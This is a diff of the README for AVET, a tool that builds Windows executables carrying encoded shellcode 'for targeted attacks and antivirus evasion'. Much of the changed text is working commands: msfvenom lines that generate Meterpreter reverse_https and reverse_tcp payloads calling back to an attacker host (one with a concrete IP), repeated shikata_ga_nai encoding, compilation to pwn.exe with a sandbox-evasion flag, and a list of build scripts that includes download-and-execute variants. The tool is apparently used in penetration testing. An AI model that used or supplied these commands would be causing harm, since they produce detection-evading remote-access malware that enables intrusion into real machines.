@@ -35,7 +35,7 @@ You'll shortly have to click through the tdm-gcc installer GUI though - standard
 If for whatever reasons you want to do things manually:
 
 How to install tdm-gcc with wine:
-https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/
+[https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/](https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/)
 
 Compile the make_avet executable:
 ```
@@ -46,8 +46,8 @@ Important Note
 --------------
 Not all techniques will evade every AV engine. If one technique or build script does not work please test another one.
 
-How to use make_avet and build scripts
---------------------------------------
+How to use 
+----------
 
 The purpose of make_avet is to preconfigure a definition file (defs.h) so that the source code can be compiled in the next step. This way the payload will be encoded as ASCII payload or with encoders from metasploit. You hardly can beat shikata-ga-nai.
 
@@ -81,14 +81,17 @@ The build scripts themselves are written so as they have to be called from withi
 root@kalidan:~/tools/avet# ./build/build_win32_meterpreter_rev_https_20xshikata.sh
 ```
 
-**However, it is strongly recommended to use the avet_fabric.py!**
+**However, it is strongly recommended to use the avet_fabric.py! It makes the tool easier to use.**
 
 The fabric provides a more convenient interface on the command line, where you can choose which build script you want to use.
 It also gives you the opportunity to alter build scripts on the fly (see below).
 
-Here's a quick example:
+The latter is especially useful as you can define new LHOST and LPORT variables for msfvenom each time you run a build script via the fabric.
+You can define default LHOST and LPORT values in the `/build/global_connect_config.sh` file, which are used if you don't redefine.
+
+Here's a quick example (python3 || gtfo):
 ```
-# ./avet_fabric.py 
+python3 avet_fabric.py 
 
                        .|        ,       +
              *         | |      ((             *
@@ -104,37 +107,64 @@ AVET Fabric by Daniel Sauder
 
 avet_fabric.py is an assistant for building exe files with shellcode payloads for targeted attacks and antivirus evasion.
 
-0: build_win32_meterpreter_rev_https_shikata_loadfile.sh
-1: build_win32_meterpreter_rev_https_shikata_fopen.sh
-2: build_win32_meterpreter_rev_https_shikata_load_ie_debug.sh
-3: build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
-4: build_win32_meterpreter_rev_https_20xshikata.sh
-5: build_win32_meterpreter_rev_https_shikata_load_ie.sh
-6: build_win64_meterpreter_rev_tcp.sh
-...
-Input number of the script you want use and hit enter: 6
+0: build_win32_meterpreter_rev_https_shikata_fopen.sh
+1: build_win32_meterpreter_rev_https_fopen_shikata.sh
+2: buildsvc_win32_meterpreter_bind_tcp_20xshikata.sh
+3: build_win32_meterpreter_rev_https_50xshikata_quiet.sh
+4: build_win32_meterpreter_rev_https_shikata_raw_loadfile.sh
+5: build_win32_meterpreter_rev_https_ASCIIMSF_cmd.sh
+6: build_win32_meterpreter_rev_https_shikata_downloadexecshellcode.sh
+7: build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
+8: build_win32_meterpreter_rev_https_ASCIIMSF.sh
+9: build_win32_meterpreter_rev_https_killswitch_shikata.sh
+10: build_win32_meterpreter_rev_https_shikata_download_powershell_raw_loadfile.sh
+11: build_win32_meterpreter_rev_https_shikata_load_ie_debug.sh
+12: build_win32_meterpreter_rev_https_shikata_download_certutil_raw_loadfile.sh
+13: build_win32_meterpreter_rev_https_50xshikata.sh
+14: build_win32_meterpreter_rev_https_shikata_loadfile.sh
+15: build_win32_meterpreter_unstaged_rev_https_40xshikata.sh
+16: build_win32_meterpreter_rev_https_shikata_downloadexecshellcode_DKMC.sh
+17: build_win32_meterpreter_rev_https_fopen_shikata_quiet.sh
+18: build_win64_meterpreter_rev_tcp_xor.sh
+19: build_win32_meterpreter_rev_https_shikata_load_ie.sh
+20: build_win64_meterpreter_rev_tcp_xor_downloadexecshellcode.sh
+21: build_win64_meterpreter_rev_tcp_xor_fopen.sh
+Input number of the script you want use and hit enter: 0
 
 Now you can edit the build script line by line.
 
 simple example script for building the .exe file
-$ . build/global_win64.sh
-make meterpreter reverse payload
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.132 lport=443 -f c --platform Windows > sc.txt
+include script containing the compiler var $win32_compiler
+you can edit the compiler in build/global_win32.sh
+or enter $win32_compiler="mycompiler" here
+$ . build/global_win32.sh
+import global default lhost and lport values from build/global_connect_config.sh
+$ . build/global_connect_config.sh
+override connect-back settings here, if necessary
+$ LPORT=$GLOBAL_LPORT
+$ LHOST=$GLOBAL_LHOST
+make meterpreter reverse payload, encoded with shikata_ga_nai
+additionaly to the avet encoder, further encoding should be used
+$ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
 format the shellcode for make_avet
 $ ./format.sh sc.txt > scclean.txt && rm sc.txt
-call make_avet, compile
-$ ./make_avet -f scclean.txt -X -E
-$ $win64_compiler -o pwn.exe avet.c
+call make_avet, the -f compiles the shellcode to the exe file, the -F is for the AV sandbox evasion
+$ ./make_avet -f scclean.txt -F -E
+compile to pwn.exe file
+$ $win32_compiler -o pwn.exe avet.c
 cleanup
 $ rm scclean.txt && echo "" > defs.h
 
 The following commands will be executed:
 #/bin/bash
-. build/global_win64.sh
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.132 lport=443 -f c --platform Windows > sc.txt
+. build/global_win32.sh
+. build/global_connect_config.sh
+LPORT=$GLOBAL_LPORT
+LHOST=$GLOBAL_LHOST
+msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
 ./format.sh sc.txt > scclean.txt && rm sc.txt
-./make_avet -f scclean.txt -X -E
-$win64_compiler -o pwn.exe avet.c
+./make_avet -f scclean.txt -F -E
+$win32_compiler -o pwn.exe avet.c
 rm scclean.txt && echo "" > defs.h
 
 Press enter to continue.
@@ -146,21 +176,12 @@ Please stand by...
 The output file should be placed in the current directory.
 
 Bye...
+
 ```
-
-
-
-
-
-
-
-
-
-
 
 Build scripts
 -------------
-Some comments on what each of the scripts provides.
+Some comments on what each script provides.
 
 ```
 buildsvc_win32_meterpreter_bind_tcp_20xshikata.sh
